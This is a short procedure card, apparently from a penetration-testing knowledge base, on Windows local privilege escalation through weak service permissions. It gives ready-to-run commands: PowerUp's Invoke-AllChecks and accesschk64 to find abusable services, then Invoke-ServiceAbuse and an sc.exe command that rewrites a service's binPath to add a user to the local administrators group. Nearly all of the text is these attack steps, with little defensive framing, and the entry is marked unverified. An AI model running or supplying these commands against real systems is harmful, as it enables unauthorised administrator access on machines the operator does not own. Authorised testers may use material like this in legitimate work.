---
id: e4184c0b-c145-4dba-ad88-1bd96557a4d4
name: Search and exploit service abuse functions
type: procedure
verified: false
submitted: false
created_at: '2023-01-12T04:55:30.297535+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
commands:
- '[[PowerUp AllChecks search for abuse functions]]'
- '[[PowerUp service abuse function exploit]]'
- '[[sc add user to local administrator group]]'
- '[[SysInternals search for service abuse function]]'
---

# Search and exploit service abuse functions

## Summary

The PowerUp module from PowerSploit includes Invoke-AllChecks that can scan a local system for vulnerabilities and abuse functions. 

## Description

# Description

The PowerUp module from PowerSploit includes Invoke-AllChecks that can scan a local system for vulnerabilities and abuse functions.



## Objective

1. Find a vulnerability to exploit, or an abuse function to exploit. This can be a service permission



# Instructions

1. Run the script to identify vulnerabilities





**Command** ([[PowerUp AllChecks search for abuse functions]]):

```bash
Invoke-AllChecks
```



(Optional) SysInternals can also be used to search for the service abuse function





**Command** ([[SysInternals search for service abuse function]]):

```bash
accesschk64.exe -uwcqv '$USERNAME' *
```







2. If the output displays an available AbuseFunction, try to exploit it using the PowerUp script: Invoke-ServiceAbuse





**Command** ([[PowerUp service abuse function exploit]]):

```bash
Invoke-ServiceAbuse -Name $SERVICE_NAME -UserName $DOMAIN\$USERNAME -Verbose
```



(Optional) sc.exe can also be used to exploit service abuse function to add a user to the local administrator group





**Command** ([[sc add user to local administrator group]]):

```bash
sc.exe config $SERVICE_NAME binPath="net localgroup administrators $DOMAIN\$USERNAME /add"
```





## Commands Used

- [[PowerUp AllChecks search for abuse functions]]
- [[PowerUp service abuse function exploit]]
- [[sc add user to local administrator group]]
- [[SysInternals search for service abuse function]]


